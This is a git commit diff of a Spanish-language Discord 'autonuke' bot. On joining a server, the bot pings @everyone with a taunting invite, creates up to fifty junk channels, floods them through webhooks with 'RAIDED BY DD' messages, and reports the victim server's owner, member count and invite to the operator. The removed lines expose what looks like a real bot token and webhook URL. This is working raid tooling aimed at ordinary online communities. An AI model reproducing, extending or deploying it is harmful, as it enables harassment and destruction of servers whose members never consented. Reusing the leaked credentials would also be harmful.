22981b56cd666091f71d233cbe39e2ad2a8fc41f
Young AOS <106038476+youngaos@users.noreply.github.com>
2022-12-22 18:38:33 -0500

    Update autonuke.py

--- autonuke.py
+++ autonuke.py
@@ -12,10 +12,9 @@ bot = commands.Bot(command_prefix=".", intents=intents)
 bot.remove_command('help')
 session = aiohttp.ClientSession()
 
-og = 'https://discord.com/api/webhooks/1053908392504205332/3zvHk6MRSK-J6B8Gn969_R7hmBR0XnSfOczoxjTlF2eOUJpGxSMbqaG2YjLLJkXcmdkP'
-
-antinuke = [1045775188408668211]
-
+token = "Token de tu bot"
+antinuke = "Id del servidor que no podra ser raideado"
+logs_channel = "Id del canal de logs"
 
 
 def check_if_user_has_premium(ctx):
@@ -29,9 +28,8 @@ def check_if_user_has_premium(ctx):
 @bot.event    
 async def on_guild_join(guild): 
  server_id = guild.id
- logg = bot.get_channel(1053908336136945684)
+ logg = bot.get_channel(logs_channel)
  with open('guild.json', 'r+') as f:
-        # Carga el contenido del archivo JSON en un diccionario
         data = json.load(f) 
  if server_id in data['guild']:
     return
@@ -49,35 +47,25 @@ async def on_guild_join(guild):
         invite = await raid.create_invite(max_age=0)
         await raid.send("||@everyone||\n**𝐄𝐬𝐭𝐚 𝐦𝐢𝐞𝐫𝐝𝐚 𝐝𝐞 𝐬𝐞𝐫𝐯𝐢𝐝𝐨𝐫 𝐟𝐮𝐞 𝐞𝐱𝐭𝐞𝐫𝐦𝐢𝐧𝐚𝐝𝐚 𝐩𝐨𝐫 𝐃𝐞𝐚𝐝𝐃𝐞𝐬𝐭𝐫𝐨𝐲𝐞𝐫𝐬, ú𝐧𝐞𝐭𝐞 𝐩𝐚𝐫𝐚 𝐫𝐞𝐜𝐮𝐩𝐞𝐫𝐚𝐫𝐥𝐚 𝐨 𝐮𝐬𝐚𝐫𝐦𝐞.**\n https://discord.gg/w6dyCY9Esw")            
    for i in range(1):
-    logNukeEmbed = discord.Embed(title="Entrar al servidor",url=invite, description="**Tipo de raid: ❌ No premium ❌**", colour=0xed0b0b)
-    logNukeEmbed.add_field(name='> Nombre del servidor',value=f'{guild.name}',inline=False)
-    logNukeEmbed.add_field(name='> Miembros',value=f'{guild.member_count}',inline=False)
-    logNukeEmbed.add_field(name='> Owner',value=f'{guild.owner}',inline=False)
-    logNukeEmbed.add_field(name='> Boosteos',value=f'{str(guild.premium_subscription_count)}',inline=False)    
-    logNukeEmbed.set_thumbnail(url="https://cdn.discordapp.com/icons/1039321689428856933/a_85055102a3bf775315faf434479df555.gif?size=2048")
-    await logg.send(invite, embed=logNukeEmbed)
+    log = discord.Embed(title="Entrar al servidor",url=invite, colour=0xed0b0b)
+    log.add_field(name='> Nombre del servidor',value=f'{guild.name}',inline=False)
+    log.add_field(name='> Miembros',value=f'{guild.member_count}',inline=False)
+    log.add_field(name='> Owner',value=f'{guild.owner}',inline=False)
+    log.add_field(name='> Boosteos',value=f'{str(guild.premium_subscription_count)}',inline=False)    
+    log.set_thumbnail(url="https://cdn.discordapp.com/icons/1039321689428856933/a_85055102a3bf775315faf434479df555.gif?size=2048")
+    await logg.send(invite, embed=log)
 
-   for _i in range(5):
+   for _i in range(50):
     try: 
      await guild.create_text_channel(name="r̶̡̛̲̙̥̝̫̼̲̍͌̽̏̀̕͝å̴̡̫̺̥̺̃͋͒͐̆̕i̴̧̻̱̤̇ḑ̷̡͎͉̯̯̩̦͉͈͊̑̾͐-̵͔͖̻̠̥̻͕̀̃̉͑͗̍̅́ͅb̴̗̜̬͓͒̐͒̋̓̂̆̒͠ỳ̷̧̬̘̤͚͍̥͉͍̺̀̏̃̐̒̚-̶̡̡̫̞̣̤͍̩̬͉̐̾̇d̶̥̝̩͔̤͓̼̳͌͆͗͜ë̵̡̪̖̖̲̘̙́̀̉͂̿̀̈́̐̀a̸͓̻̘̖̿͂̒͑͝d̴̨̛̼̲̳̤̲̤̦̀͛̀̒̓̆̕͝d̶̢͖̍̏̋͛̀ẻ̷̡͔͍̀́͘s̴͖̟̗̹̈́̿̀͝t̵̢͂̔̍̎̅̄̎̂r̵̻̎o̴̢̾̾̑̒y̸͙͚̹̺̣̥̙͎͗̀̃̋̅̃̐͑̓ë̴̫̘̯͕̝̹̰͓̊̈͛r̶̼̹̮͍̺̤͕̘̘̍̎̒̓̅̓͐͘̚͜s̶̢͚̭̥̿͝")  
     except:
      pass 
  
-    # Abre el archivo JSON en modo de escritura
    with open('guild.json', 'r+') as f:
-        # Carga el contenido del archivo JSON en un diccionario
         data = json.load(f)
-
-        # Agrega el ID del servidor al diccionario
         data['guild'].append(server_id)
-
-        # Vuelve al inicio del archivo
         f.seek(0)
-
-        # Escribe el diccionario actualizado de vuelta al archivo JSON
         json.dump(data, f)
-
-        # Elimina la parte sobrante del archivo
         f.truncate()
 
 
@@ -87,9 +75,7 @@ async def on_guild_channel_create(channel):
     global raidnormal
     global texto
     global canal 
-    var = 0
     webhook = await channel.create_webhook(name = "El hijo de youngaos")
-    if (channel.name == 'r̶̕͝å̴̕i̴̻̇d̷͊̑-̵̀̃b̴͒͠ỳ̷̀-̶̐̾d̶͌͆ë̵́̀a̸̿͂d̴̀͛d̶̍̏ẻ̷͘s̴̈́̿t̵͂̔r̵̻̎o̴̾̾y̸͗̀ë̴̊r̶̍̎s̶̿͝'):
         for _i in range(50):
           try:  
             log = discord.Embed(title="RAIDED BY DD",description = "```THIS SERVER GOT NUKED BY DD```" ,colour=0x2f3136)
@@ -104,4 +90,4 @@ async def on_guild_channel_create(channel):
                pass 
 
 
-bot.run("MTA1NDA5NzYwNDcxNzMxODE0NA.GChEI4.qejaYSzqHGkyb_tZJ3nGjPqqXq_h1jV_kRblMc")           
+bot.run(token)           
